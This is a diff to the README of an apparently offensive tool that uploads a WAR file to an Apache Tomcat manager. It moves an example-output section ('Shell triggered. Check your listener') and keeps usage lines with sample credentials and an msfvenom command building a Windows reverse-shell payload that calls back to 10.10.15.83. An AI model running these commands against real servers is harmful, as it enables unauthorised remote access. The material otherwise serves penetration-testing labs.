@@ -64,7 +64,17 @@ python3 tomcat_war_uploader.py --url http://10.10.10.10:8080 --username tomcat -
 ```bash
 python3 tomcat_war_uploader.py --url http://10.10.10.10:8080 --username tomcat --password s3cret --validate-credentials
 ```
+---
 
+## ✅ Output
+
+```text
+[+] Parsed CSRF token: A1B2C3D4E5F6...
+[+] War file uploaded successfully
+[+] Shell triggered. Check your listener
+```
+
+---
 ---
 
 ## 🎯 Generating a Reverse Shell with `msfvenom`
@@ -87,17 +97,6 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.83 LPORT=9002 -f war > revs
 
 ---
 
----
-
-## ✅ Output
-
-```text
-[+] Parsed CSRF token: A1B2C3D4E5F6...
-[+] War file uploaded successfully
-[+] Shell triggered. Check your listener
-```
-
----
 
 ## ⚠️ Disclaimer
 
